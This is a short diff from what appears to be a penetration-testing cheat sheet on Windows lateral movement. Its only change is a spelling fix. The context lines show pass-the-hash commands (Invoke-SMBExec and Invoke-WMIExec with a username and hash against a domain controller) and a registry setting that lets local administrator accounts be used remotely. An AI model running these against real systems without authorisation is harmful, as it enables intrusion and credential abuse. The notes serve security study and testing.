@@ -377,7 +377,7 @@ PS> Invoke-SMBExec -Target IP -Domain xxx -Username xxx -Hash xxx -Command "net 
 PS> Invoke-WMIExec -Target DC01 -Domain xxx.xxx -Username xxx -Hash xxx -Command "cmd.exe"
 ```
 
-⚠️ We cannot remotely access a local administrator account by default. If `FilterAdministratorToken` is disabled, you can set  `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` to 1 to by-pass this check.
+⚠️ We cannot remotely access a local administrator account by default. If `FilterAdministratorToken` is disabled, you can set  `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` to 1 to bypass this check.
 </div><div>
 
 #### Pass-the-ticket (ptt)
